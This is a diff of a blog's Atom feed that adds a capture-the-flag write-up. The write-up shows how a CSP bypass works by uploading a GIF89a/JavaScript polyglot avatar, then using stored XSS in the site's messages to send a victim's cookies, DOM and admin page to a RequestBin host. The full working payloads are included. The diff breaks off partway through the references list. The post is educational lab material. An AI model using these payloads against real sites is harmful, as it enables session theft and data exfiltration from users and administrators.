@@ -1,5 +1,169 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.1.6">Jekyll</generator><link href="http://devalias.net//feed.xml" rel="self" type="application/atom+xml" /><link href="http://devalias.net//" rel="alternate" type="text/html" /><updated>2016-09-07T12:41:54+10:00</updated><id>http://devalias.net//</id><title>/dev/alias – Hack. Dev. Transcend.</title><subtitle>Follow me into the rabbit hole that is my mind and learn about topics including.. security, technology, efficiency, biohacking, health, personal growth and probably a whole lot more.
-</subtitle><entry><title>GraphQL: Why You Should Care</title><link href="http://devalias.net//devalias/2016/09/07/graphql-why-you-should-care/" rel="alternate" type="text/html" title="GraphQL: Why You Should Care" /><published>2016-09-07T00:00:00+10:00</published><updated>2016-09-07T00:00:00+10:00</updated><id>http://devalias.net//devalias/2016/09/07/graphql-why-you-should-care</id><content type="html" xml:base="http://devalias.net//devalias/2016/09/07/graphql-why-you-should-care/">&lt;p&gt;If you haven&amp;#39;t yet come across &lt;a href=&quot;http://graphql.org/&quot;&gt;GraphQL&lt;/a&gt;, it&amp;#39;s kind of exciting stuff. It&amp;#39;s a query language developed by &lt;a href=&quot;https://code.facebook.com/posts/&quot;&gt;Facebook&lt;/a&gt;, that basically lets you request exactly the data you need for the given task; no more, no less. Sounds good right?&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.1.6">Jekyll</generator><link href="http://devalias.net//feed.xml" rel="self" type="application/atom+xml" /><link href="http://devalias.net//" rel="alternate" type="text/html" /><updated>2016-09-16T10:16:54+10:00</updated><id>http://devalias.net//</id><title>/dev/alias – Hack. Dev. Transcend.</title><subtitle>Follow me into the rabbit hole that is my mind and learn about topics including.. security, technology, efficiency, biohacking, health, personal growth and probably a whole lot more.
+</subtitle><entry><title>CTF Snippets: XSS.gif</title><link href="http://devalias.net//devalias/2016/09/16/ctf-snippets-xss-gif/" rel="alternate" type="text/html" title="CTF Snippets: XSS.gif" /><published>2016-09-16T00:00:00+10:00</published><updated>2016-09-16T00:00:00+10:00</updated><id>http://devalias.net//devalias/2016/09/16/ctf-snippets-xss-gif</id><content type="html" xml:base="http://devalias.net//devalias/2016/09/16/ctf-snippets-xss-gif/">&lt;p&gt;I was playing around with the top challenge on the CTF at &lt;a href=&quot;http://www.sectalks.org/canberra/&quot;&gt;SecTalks&lt;/a&gt; the other night, and thought I&amp;#39;d do a quick writeup of some of the techniques required; for future reference, and to help others to learn.&lt;/p&gt;
+
+&lt;h2&gt;Hack the gibso.. Website&lt;/h2&gt;
+
+&lt;p&gt;To start off, we were given a URL to a website that looked like a pretty standard sort of blog. Features included things like account registration/login, avatar upload, messaging between users, search, posts (not by a standard account), comments on posts (standard account), showing online users, etc. And the &lt;code&gt;administrator&lt;/code&gt; was online.. interesting.&lt;/p&gt;
+
+&lt;p&gt;Poking around at things, I discovered that the messaging system didn&amp;#39;t seem to filter out HTML from the subject/message body. Easy! (or so I thought) I put together a super basic PoC XSS payload and tried it out by sending a message to my own account:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;XSS&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I checked the message.. but for some reason it didn&amp;#39;t pop, even though my payload seemed fine in the source. :(&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;well&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;XSS&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Looking at the developer console gave me some more insight. Apparently this site had &lt;a href=&quot;https://en.wikipedia.org/wiki/Content_Security_Policy&quot;&gt;Content Security Policy&lt;/a&gt; enabled, and it was blocking my payload.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Refused to execute inline script because it violates the following Content Security Policy directive: &amp;quot;script-src &amp;#39;self&amp;#39;&amp;quot;. Either the &amp;#39;unsafe-inline&amp;#39; keyword, a hash (&amp;#39;sha256-kNShxzU0TYI8w1bsujgbPcQ4oIISMT9erFfdwx1ma+M=&amp;#39;), or a nonce (&amp;#39;nonce-...&amp;#39;) is required to enable inline execution.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Probably should have noticed those headers earlier.. Oh well, now to find a way around them. With spacing added for readability, the headers looked like:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;Content-Security-Policy:
+  default-src &#39;none&#39;;
+  img-src &#39;self&#39; placehold.it *.imgix.net;
+  script-src &#39;self&#39;;
+  connect-src &#39;self&#39;;
+  style-src &#39;self&#39; fonts.gstatic.com fonts.googleapis.com;
+  font-src &#39;self&#39; fonts.googleapis.com fonts.gstatic.com;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Since compromising Google or any other websites just to beat this CTF seemed out of the question, I figured I needed a way to get my script payload uploaded so that it would run from &lt;code&gt;self&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;How about that avatar upload functionality? Well, as you might expect, it was restricted to uploading images. But surely we could find a way around that.. right? Seems so! By making use of a super simple image format, we could trick the image checker and upload our payload.&lt;/p&gt;
+
+&lt;p&gt;Using the &lt;code&gt;GIF89a&lt;/code&gt; format (which conveniently starts with it&amp;#39;s name, then the rest is the GIF payload) I constructed and uploaded my new &amp;#39;avatar&amp;#39; &lt;code&gt;pwn.gif&lt;/code&gt;, designed to steal cookies via &lt;a href=&quot;http://requestb.in/&quot;&gt;RequestBin&lt;/a&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;nx&quot;&gt;GIF89a&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/*.......*/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;http://requestb.in/secretcode?c=&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This passed the file format checker (which should have seen it as a GIF), and hopefully when I included it in my XSS, the JavaScript would execute. Not the stealthiest payload, but it should do the trick. It was time to test out my new &amp;#39;avatar&amp;#39; by sending myself a test message:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://example.com/uploads/filenamehash.gif&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Loading the new message.. there was still no payload! :( It seems Chrome foiled my plans again:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Refused to execute script from &amp;#39;&lt;a href=&quot;http://example.com/uploads/filenamehash.gif&quot;&gt;http://example.com/uploads/filenamehash.gif&lt;/a&gt;&amp;#39; because its MIME type (&amp;#39;image/gif&amp;#39;) is not executable.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This seemed like a browser specific security feature though, so trying it out in Safari, my payload executed. Good work Apple security! Checking the captured results on RequestBin there were no cookies. Guess I probably should have looked at that &lt;code&gt;HttpOnly&lt;/code&gt; flag first.. Sometimes I just get caught up in the heat of the moment.&lt;/p&gt;
+
+&lt;p&gt;Ok.. so we couldn&amp;#39;t steal the cookies.. but what could we do? &lt;a href=&quot;https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)&quot;&gt;Cross-Site Request Forgery (CSRF)&lt;/a&gt; maybe? There was a CSRF token designed to prevent this, but it didn&amp;#39;t seem to get validated. That&amp;#39;s good.. but what should we target?&lt;/p&gt;
+
+&lt;p&gt;Needing some better visibility on the situation, I decided to just steal the whole &lt;a href=&quot;https://en.wikipedia.org/wiki/Document_Object_Model&quot;&gt;DOM&lt;/a&gt; and have a look around. Maybe the administrator had other cool things to look at? Hacker-eyes activate! (comments added for clarity):&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;nx&quot;&gt;GIF89a&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/*.......*/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* Wait for the page to fully load */&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;cm&quot;&gt;/* Create a form to send to RequestBin */&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;form&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haxForm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://requestb.in/secretcode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+  &lt;span class=&quot;cm&quot;&gt;/* Create a textarea to store our data */&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;textarea&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haxPayload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+  &lt;span class=&quot;cm&quot;&gt;/* Capture the entire DOM and Base64 encode it */&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;documentElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;outerHTML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+  &lt;span class=&quot;cm&quot;&gt;/* Inject the form and send it */&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haxForm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Ignoring my rusty JavsScript, the new payload would create a HTML &lt;code&gt;form&lt;/code&gt; element with a &lt;code&gt;textarea&lt;/code&gt;, grab the entire contents of the DOM, &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/WindowBase64/btoa&quot;&gt;Base64 encode&lt;/a&gt; them, stick them in the &lt;code&gt;textarea&lt;/code&gt;, inject the &lt;code&gt;form&lt;/code&gt; into the page, then send that off to RequestBin.&lt;/p&gt;
+
+&lt;p&gt;After checking that this actually worked against my own account, I sent a message to the administrator and waited. After a minute or so, the message status changed to read. Heading over to RequestBin and decoding the captured DOM, I found the following snippet:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin.php&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Administration&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Sweet, let&amp;#39;s find something juicy on that page! Reworking the payload (with a little help from &lt;a href=&quot;https://api.jquery.com/jquery.get/&quot;&gt;JQuery&lt;/a&gt; that was already on the site):&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;nx&quot;&gt;GIF89a&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/*.......*/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* Wait for the page to fully load */&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;cm&quot;&gt;/* Create a form to send to RequestBin */&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;form&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haxForm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://requestb.in/secretcode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+  &lt;span class=&quot;cm&quot;&gt;/* Create a textarea to store our data */&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;textarea&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haxPayload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+  &lt;span class=&quot;cm&quot;&gt;/* Inject the form */&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+  &lt;span class=&quot;cm&quot;&gt;/* Load the admin page ajax-style, Base64 encode it, send it off */&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;admin.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haxForm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Using the last payload as the template, I updated it to load the &lt;code&gt;admin.php&lt;/code&gt; page via ajax, Base64 encode the result and send it to RequestBin. After uploading, messaging the administrator, waiting, checking the  response and decoding; it seemed there wasn&amp;#39;t even a need to do anything else:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;legend&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;h3&amp;gt;&lt;/span&gt;Administration&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/legend&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h4&amp;gt;&lt;/span&gt;flag{the-secret-flag-code}&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h4&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Mischief managed!&lt;/p&gt;
+
+&lt;h2&gt;Raw Notes&lt;/h2&gt;
+
+&lt;p&gt;I figured it might be fun to include the raw snippets of notes I made as I was going through this, to give a better idea of my thought process throughout:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Administrator is online&lt;/li&gt;
+&lt;li&gt;We can send messages to users&lt;/li&gt;
+&lt;li&gt;We can inject images/etc in messages, but ContentSecurityPolicy blocks us from executing code from anywhere but self&lt;/li&gt;
+&lt;li&gt;We can upload image files (can we make that other types?)
+
+&lt;ul&gt;
+&lt;li&gt;GIF89a based XSS, won&amp;#39;t exec in chrome though..&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;Administrator will read messages we send them (check the &amp;#39;sent&amp;#39; page)&lt;/li&gt;
+&lt;li&gt;Admin isn&amp;#39;t using chrome! :p&lt;/li&gt;
+&lt;li&gt;The request doesn&amp;#39;t send us any cookies! :( (they&amp;#39;re HTTP only)&lt;/li&gt;
+&lt;li&gt;CSRF token doesn&amp;#39;t seem to actually be validated.. What can we CSRF..?&lt;/li&gt;
+&lt;li&gt;Use the XSS to send us the admin&amp;#39;s DOM&lt;/li&gt;
+&lt;li&gt;Seems there&amp;#39;s an admin.php page..&lt;/li&gt;
+&lt;li&gt;Ajax the admin page&lt;/li&gt;
+&lt;li&gt;Success!&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;This CTF was a pretty fun little challenge, tying together XSS, CSP bypass, file upload/image abuse and snooping through the DOM.&lt;/p&gt;
+
+&lt;p&gt;Has this helped you learn something new? Got a better way to approach it? I&amp;#39;d love to hear from you in the comments!&lt;/p&gt;
+
+&lt;h2&gt;References&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Content Security Policy
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Content_Security_Policy&quot;&gt;Content Security Policy | OWASP&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Content_Security_Policy_Cheat_Sheet&quot;&gt;Content Security Policy Cheat Sheet | OWASP&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.html5rocks.com/en/tutorials/security/content-security-policy/&quot;&gt;&amp;quot;An Introduction to Content Security Policy&amp;quot; by HTML5 Rocks&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://content-security-policy.com/&quot;&gt;Content Security Policy References and Examples&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;File Upload/Image XSS
+
+&lt;ul&gt;
